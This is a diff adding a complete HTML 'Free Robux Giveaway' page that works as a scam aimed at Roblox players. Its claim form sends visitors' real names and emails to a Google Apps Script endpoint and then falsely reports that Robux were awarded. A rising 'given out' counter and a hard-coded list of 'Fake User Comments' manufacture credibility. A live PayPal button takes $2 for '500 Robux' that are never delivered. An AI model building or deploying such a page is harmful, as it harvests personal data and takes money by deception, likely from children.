@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Free Robux Giveaway</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #0d1117;
+      color: white;
+      text-align: center;
+      margin: 0;
+      padding: 20px;
+    }
+
+    h1 {
+      font-size: 2.5em;
+      color: #00ff99;
+    }
+
+    .section {
+      background: #161b22;
+      margin: 20px auto;
+      padding: 20px;
+      border-radius: 12px;
+      max-width: 500px;
+      box-shadow: 0 0 15px #00ffcc55;
+    }
+
+    button {
+      background: #00ff99;
+      border: none;
+      padding: 10px 20px;
+      font-size: 1.2em;
+      border-radius: 8px;
+      cursor: pointer;
+      color: #000;
+      margin-top: 10px;
+    }
+
+    input {
+      width: 90%;
+      padding: 10px;
+      margin: 8px 0;
+      border: none;
+      border-radius: 6px;
+      font-size: 1em;
+    }
+
+    .paypal {
+      margin-top: 10px;
+    }
+
+    .user-list {
+      font-size: 0.95em;
+      animation: scrollUsers 15s linear infinite;
+      height: 150px;
+      overflow: hidden;
+    }
+
+    .user-list div {
+      padding: 5px 0;
+    }
+
+    @keyframes scrollUsers {
+      0% { transform: translateY(0); }
+      100% { transform: translateY(-50%); }
+    }
+  </style>
+</head>
+<body>
+
+  <h1>🔥 Free Robux Giveaway 🔥</h1>
+
+  <div class="section">
+    <h2>Total Robux Given Out: <span id="totalRobux">10000</span></h2>
+  </div>
+
+  <div class="section">
+    <h3>Tap to Earn Robux</h3>
+    <p>Robux Earned: <span id="earned">0</span></p>
+    <button onclick="tapRobux()">Tap</button>
+  </div>
+
+  <div class="section">
+    <h3>Claim Your Robux</h3>
+    <form id="robuxForm">
+      <input type="text" id="realname" placeholder="Your Real Name" required><br>
+      <input type="email" id="email" placeholder="Your Email" required><br>
+      <button type="submit">Claim Robux</button>
+    </form>
+  </div>
+
+  <div class="section">
+    <h3>💎 Want More Robux Instantly?</h3>
+    <p><strong>Get 500 Robux for just $2</strong></p>
+    <div id="paypal-button-container" class="paypal"></div>
+  </div>
+
+  <div class="section">
+    <h3>Live Comments</h3>
+    <div class="user-list" id="userList">
+      <!-- User comments will go here -->
+    </div>
+  </div>
+
+  <!-- PayPal Script -->
+  <script src="https://www.paypal.com/sdk/js?client-id=AZWsJ7wF5ZVDTuOoPNBxvXuWtkmxY3669V0701HFx4VgcumQVgcCdhS9f4dOq3p1pl7YLOLGNhVcroyN&currency=USD"></script>
+
+  <script>
+    // Tap Robux Logic
+    let earned = 0;
+    function tapRobux() {
+      earned += 0.001;
+      document.getElementById("earned").textContent = earned.toFixed(3);
+    }
+
+    // Robux Given Out Counter
+    let total = 10000;
+    setInterval(() => {
+      total += Math.floor(Math.random() * 3) + 1;
+      document.getElementById("totalRobux").textContent = total;
+    }, 3000);
+
+    // Fake User Comments
+    const users = [
+      "CoolNinja42 got 300 Robux",
+      "ProBuilder22 got 150 Robux",
+      "GamerGirl77 got 450 Robux",
+      "BloxKing21 got 250 Robux",
+      "BuilderBob88 got 100 Robux",
+      "EpicMiner9 got 200 Robux",
+      "SkyFlyer7 got 500 Robux",
+      "BlockMaster55 got 120 Robux",
+      "SwordSlasher got 350 Robux",
+      "SpeedRunX got 400 Robux",
+      "NoobMaster got 180 Robux",
+      "ShinyDuck13 got 260 Robux",
+      "CraftyDev got 290 Robux",
+      "SuperSwordz got 330 Robux",
+      "PixelHero got 370 Robux",
+      "JumpJack got 410 Robux",
+      "FlyBoy9000 got 280 Robux",
+      "VictoryVibes got 390 Robux"
+    ];
+
+    function cycleUsers() {
+      const list = document.getElementById("userList");
+      list.innerHTML = '';
+      users.forEach(user => {
+        const div = document.createElement("div");
+        div.textContent = user;
+        list.appendChild(div);
+      });
+    }
+    cycleUsers();
+
+    // Form Submission to Google Sheets
+    document.getElementById("robuxForm").addEventListener("submit", function(e){
+      e.preventDefault();
+      const name = document.getElementById("realname").value;
+      const email = document.getElementById("email").value;
+
+      fetch("https://script.google.com/macros/s/AKfycbyeem6-qQXNw_Qcm5wMQlVHsiN_vssVRexuc9lXJgPXm5bbTW93O22W7AFadhKkm9Knxg/exec", {
+        method: "POST",
+        body: new URLSearchParams({ name: name, email: email })
+      }).then(response => {
+        alert("🎉 Congratulations! You have received 200 Robux!");
+      }).catch(() => {
+        alert("Something went wrong. Please try again.");
+      });
+    });
+
+    // PayPal Payment Logic
+    paypal.Buttons({
+      style: {
+        layout: 'vertical',
+        color: 'blue',
+        shape: 'pill',
+        label: 'paypal'
+      },
+      createOrder: function(data, actions) {
+        return actions.order.create({
+          purchase_units: [{
+            amount: { value: '2.00' },
+            description: "Buy 500 Robux"
+          }]
+        });
+      },
+      onApprove: function(data, actions) {
+        return actions.order.capture().then(function(details) {
+          alert('✅ Payment successful! You have received 500 Robux.');
+        });
+      }
+    }).render('#paypal-button-container');
+  </script>
+</body>
+</html>
